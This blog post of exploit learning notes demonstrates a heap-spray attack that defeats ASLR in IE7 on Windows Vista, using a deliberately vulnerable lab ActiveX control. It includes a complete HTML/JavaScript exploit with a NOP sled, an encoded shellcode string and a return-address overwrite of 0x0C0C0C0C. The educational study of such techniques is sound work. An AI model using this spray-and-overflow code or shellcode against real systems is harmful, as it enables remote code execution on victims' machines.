---
title: Exploit learning notes 019 Using HeapSpray Attack ASLR
description: Use Heap Spray technique to attack ASLR and locate shellcode
date: 2020-11-28 12:38:00+0800
categories:
    - Exploit
tags:
    - Windows
    - HeapSpray
---

Source: [Moeomu's blog](/posts/exploit-learning-notes-019-using-heapspray-attack-aslr/)

## Principle

By requesting a large amount of memory, occupying the 0x0C0C0C0C locations in memory, and placing 0x90 and shellcode in these memories, and finally controlling the program to go to 0x0C0C0C0C for execution. As long as the luck is not so bad that 0x0C0C0C0C0C happens to be located somewhere in the shellcode, the shellcode will be executed successfully

## Experiment

### Preparation

> Environment: System: Windows Vista SP0, DEP Status: Default, Browser: IE7

- Still use the previously used [Vulner_AX.dll](https://pan.moeomu.com/Tutorial/0Day安全-资料/VulnerAX_SEH/VulnerAX.ocx) as the target of the attack
- UUID of `CVulnerAXCtrl's class information` in `VulnerAX.idl`: `ACA3927C-6BD1-4B4E-8697-72481279AAEC`

### Idea

- We use the Heap spray technique to request 200 1MB memory blocks in memory to counteract the randomization process of ASLR
- Each memory block contains 0x90 padding and shellcode
- After Heap spray we occupy the memory near `0x0C0C0C0C`, we just control the program to go to `0x0C0C0C0C` for execution, and after several 0x90 slides we can reach the shellcode range and execute
- There is a typical overflow vulnerability in the test function, where the function return address can be overwritten by copying a very long string
- We will overwrite the function return address as `0x0C0C0C0C`, after the function execution returns to execution will be transferred to the memory space we apply

### Code

```html
<html>
<body>
<script>
    var nops = unescape("%u9090%u9090");
    var shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857";
    while (nops.length < 0x100000)
        nops += nops;
    nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length);
    nops = nops + shellcode;
    var memory = new Array();
    for (var i = 0; i < 200; i++)
        memory[i] += nops;
</script>
<object classid="clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC" id="test"> </object>
<script>
    var s = "\u9090";
    while (s.length < 54)
    {
        s += "\u9090";
    }
    s += "\u0C0C\u0C0C";
    test.test(s);
</script>
</body>
</html>
```

### Result

- Successful attack on ASLR, as shown in the figure

![pic1](https://s3.ax1x.com/2020/11/28/DyUSMR.png)  
![pic2](https://s3.ax1x.com/2020/11/28/DyUcl9.jpg)  
![pic3](https://s3.ax1x.com/2020/11/28/DyN3vR.png)
